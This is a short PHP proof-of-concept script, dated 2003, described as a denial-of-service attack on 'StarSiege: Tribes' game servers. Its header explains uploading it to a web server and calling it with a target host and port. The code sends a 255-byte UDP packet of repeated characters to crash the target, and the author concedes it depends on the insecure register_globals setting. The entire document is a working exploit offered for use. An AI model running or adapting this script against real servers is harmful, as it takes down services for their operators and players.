<?php
/* 
Author: st0ic <st0ic@fsix.net>
Website: http://www.fsix.net/
Name: byebye_tribes.php
Original Date: 07/14/2003
Purpose: POC "StarSiege: Tribes" DoS

Usage: Call it from a browser once its uploaded on a server
with PHP installed:

http://host/byebye_tribes.php?host=127.0.0.1&port=28001

Note - global variables must be enabled in php.ini (yes... I 
know thats bad too)

Stuff:
Yeah... too lazy to fine tune it, maybe someone else can
throw in HTML forms to give it a little interface ;-).
*/

$fp = fsockopen("udp://$host", $port, $errno, $errstr, 30);
if (!$fp) 
{
	echo "$errstr ($errno)<br>\n";
	exit;
}
else
{
	$char = "a";
	for($a = 0; $a < 255; $a++)
		$data = $data.$char;

	if(fputs ($fp, $data) )
		echo "successful<br>";
	else
		echo "error<br>";
}
?>